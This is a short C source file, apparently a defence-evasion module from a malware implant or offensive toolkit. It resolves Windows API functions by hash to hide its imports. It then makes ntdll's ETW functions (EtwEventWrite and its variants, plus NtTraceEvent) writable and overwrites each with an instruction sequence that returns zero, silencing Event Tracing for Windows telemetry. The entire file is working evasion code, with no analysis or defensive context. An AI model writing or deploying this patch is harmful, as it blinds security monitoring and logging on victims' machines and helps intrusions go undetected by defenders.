#include "Evasion.h"
#include "Resolve.h"
#include "Hashes.h"

static BOOL Stub(PVOID fn) {
    typedef BOOL (WINAPI* fn_Prot)(LPVOID, SIZE_T, DWORD, PDWORD);

    HMODULE k32 = ResolveModuleH(H_KERNEL32);
    fn_Prot pProt = (fn_Prot)ResolveFuncH(k32, H_VirtualProtect);
    if (!fn || !pProt)
        return FALSE;

    DWORD old = 0;
    if (!pProt(fn, 3, PAGE_EXECUTE_READWRITE, &old))
        return FALSE;

    PUCHAR p = (PUCHAR)fn;
    p[0] = 0x33;
    p[1] = 0xC0;
    p[2] = 0xC3;

    DWORD tmp = 0;
    pProt(fn, 3, old, &tmp);
    return TRUE;
}

VOID EtwBlind(VOID) {
    HMODULE ntdll = ResolveModuleH(H_NTDLL);
    if (!ntdll)
        return;

    DWORD targets[] = {
        H_EtwEventWrite,
        H_EtwEventWriteFull,
        H_EtwEventWriteEx,
        H_EtwEventWriteString,
        H_EtwEventWriteTransfer,
        H_NtTraceEvent,
    };

    for (UINT32 i = 0; i < sizeof(targets) / sizeof(targets[0]); i++) {
        PVOID p = (PVOID)ResolveFuncH(ntdll, targets[i]);
        if (p)
            Stub(p);
    }
}
